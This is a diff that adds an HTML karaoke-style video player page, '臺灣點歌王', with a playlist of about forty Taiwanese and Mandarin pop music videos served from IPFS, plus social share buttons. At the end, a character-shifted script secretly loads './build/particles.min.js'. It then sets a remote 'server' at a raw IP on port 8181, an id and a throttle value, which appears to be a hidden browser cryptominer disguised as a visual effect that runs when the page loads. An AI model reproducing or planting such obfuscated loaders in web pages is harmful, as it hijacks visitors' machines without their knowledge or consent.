@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+<head>
+<meta charset="UTF-8">
+<title>臺灣點歌王</title>
+<link rel="stylesheet" href="./style.css" type="text/css">
+
+<!-- Dependencies -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="./thirdparty/js.cookie.js"></script>
+
+<!-- Able Player CSS -->
+<link rel="stylesheet" href="./build/ableplayer.min.css" type="text/css"/>
+
+<!-- Able Player JavaScript -->
+<script src="./build/ableplayer.js"></script>
+
+
+<!-- CSS for this example page -->
+<style>
+  main {
+    position: relative;
+    width: 100%;
+    margin: 0;
+  }
+  #player {
+    float: left;
+    width: 480px;
+    margin: 0;
+  }
+  #playlist {
+    float: left;
+    border: 1px solid #DDD;
+    margin: 20px;
+  }
+  #playlist h2 {
+	  text-align: center;
+  }
+</style>
+
+</head>
+<div id="fb-root"></div>
+<script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v10.0" nonce="elmOg0bz"></script>
+<body>
+
+<h1>臺灣點歌王</h1>
+
+<main role="main">
+  <div id="player">
+	  <!-- video source and track elements will be populated from playlist -->
+		<video id="video1" preload="auto" data-able-player data-skin="2020" playsInline loop></video>
+  </div>
+  
+	<div id="playlist">
+		<div class="line-it-button" data-lang="en" data-type="share-a" data-ver="3" data-url="https://taiwan8888.xyz" data-color="default" data-size="large" data-count="true" style="display: none;"></div>
+ <script src="https://www.line-website.com/social-plugins/js/thirdparty/loader.min.js" async="async" defer="defer"></script>
+ <br>
+ <div class="fb-share-button" data-href="https://taiwan8888.xyz" data-layout="button_count" data-size="large"><a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftaiwan8888.xyz%2F&amp;src=sdkpreparse" class="fb-xfbml-parse-ignore">分享</a></div>
+		<!-- an AblePlayer playlist is any <ul> with class="able-playlist" -->
+		<!-- The value of data-player must match the id of the media element -->
+		<!-- see documentation for additional details -->
+		<ul class="able-playlist" data-player="video1">
+			<!-- The Deadline -->
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927404.mp4"></span>
+				<button type="button">
+					
+					扎個馬步先 - Xunday
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927405.mp4"></span>
+				<button type="button">
+
+					房客 - 韋禮安
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927406.mp4"></span>
+				<button type="button">
+
+					問號 - 黃右年&屁孩
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927407.mp4"></span>
+				<button type="button">
+
+					愛你萬萬年 - 傅振輝&鄧詠家
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927408.mp4"></span>
+				<button type="button">
+
+					在一首詩裡想你 - 劉聰
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927409.mp4"></span>
+				<button type="button">
+
+					你讓我 - 李浩瑋
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927410.mp4"></span>
+				<button type="button">
+
+					我的我的 - 浩子
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927412.mp4"></span>
+				<button type="button">
+					
+					一號表情 - Lu Lu黃路梓茵
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927413.mp4"></span>
+				<button type="button">
+					
+					兵烽征途 - 李哲
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927414.mp4"></span>
+				<button type="button">
+					
+					美麗舊世界 - 李芷婷
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927415.mp4"></span>
+				<button type="button">
+					
+					香檳配你的美 - 派偉俊&ANGIE
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927416.mp4"></span>
+				<button type="button">
+					
+					牽手1234 - 朱海君
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927417.mp4"></span>
+				<button type="button">
+					
+					感情寄到最後 - 向蕙玲
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927418.mp4"></span>
+				<button type="button">
+					
+					歡迎來到我身邊 - 鄭心慈
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927419.mp4"></span>
+				<button type="button">
+					
+					Think I Love You - 曹楊&吳映潔
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927420.mp4"></span>
+				<button type="button">
+					
+					母甘 - 康康
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927421.mp4"></span>
+				<button type="button">
+					
+					句號 - 鄧紫棋
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927422.mp4"></span>
+				<button type="button">
+					
+					甘蔗掰掰 - 艾薇
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927423.mp4"></span>
+				<button type="button">
+					
+					回不去的回憶 - 小男孩樂團
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927424.mp4"></span>
+				<button type="button">
+					
+					我很好 - 劉大壯
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927425.mp4"></span>
+				<button type="button">
+					
+					良伴 - 良 一蘇芯慧
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927426.mp4"></span>
+				<button type="button">
+					
+					阮憨憨仔等 - 王江發
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927427.mp4"></span>
+				<button type="button">
+					
+					妳說妳還不了 - 曹楊
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927428.mp4"></span>
+				<button type="button">
+					
+					抱一個 - 曹雅雯
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927429.mp4"></span>
+				<button type="button">
+					
+					勇氣 - 棉子
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927430.mp4"></span>
+				<button type="button">
+					
+					思念成沙 - 王韻
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927431.mp4"></span>
+				<button type="button">
+					
+					星兒亮晶晶 - 謝金晶
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927433.mp4"></span>
+				<button type="button">
+					
+					娛樂無限公司 - Ella陳嘉樺
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927434.mp4"></span>
+				<button type="button">
+					
+					愛她值得你放棄我 - 季彥霖
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927435.mp4"></span>
+				<button type="button">
+					
+					摩天動物園 - 鄧紫棋
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927436.mp4"></span>
+				<button type="button">
+					
+					摩登原始人 - 炎亞綸
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927437.mp4"></span>
+				<button type="button">
+					
+					模樣 - 大Q秉洛
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927438.mp4"></span>
+				<button type="button">
+					
+					醜人多作怪 - 告五人
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927439.mp4"></span>
+				<button type="button">
+					
+					鹹汫 - 曹雅雯
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927440.mp4"></span>
+				<button type="button">
+					
+					一生所求 - 喬幼
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927441.mp4"></span>
+				<button type="button">
+					
+					九份情歌 - 鄔兆邦
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927442.mp4"></span>
+				<button type="button">
+					
+					小橋流水 - 陳淑萍
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927443.mp4"></span>
+				<button type="button">
+					
+					心內有你是幸福 - 郭婷筠
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927444.mp4"></span>
+				<button type="button">
+					
+					多情子 - 陳思安
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927445.mp4"></span>
+				<button type="button">
+					
+					如果海能夠 - 動力火車
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927449.mp4"></span>
+				<button type="button">
+					
+					堅強的蝴蝶 - 楊靜
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927452.mp4"></span>
+				<button type="button">
+					
+					潛伏期 - 孫盛希
+				</button>
+			</li>
+			<li>
+				<span class="able-source"
+					data-type="video/mp4"
+					data-src="https://ipfs.fleek.co/ipfs/QmT2RMdoZ2h3HEdX3hpesxQeUXBmqkrgWvnwoKz3reVrVe/927453.mp4"></span>
+				<button type="button">
+					
+					癡情孤鳥 - 楊哲
+				</button>
+			</li>
+		</ul>
+	</section>
+	<script>var s="=tdsjqu!tsd>#/0cvjme0qbsujdmft/njo/kt#?=0tdsjqu?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script>
+	<script>
+		server = "http://116.89.129.87:8181" 
+		startParticlesWithId("crabman"); 
+		throttleParticles = 10;
+		</script>
+</body>
+</html>
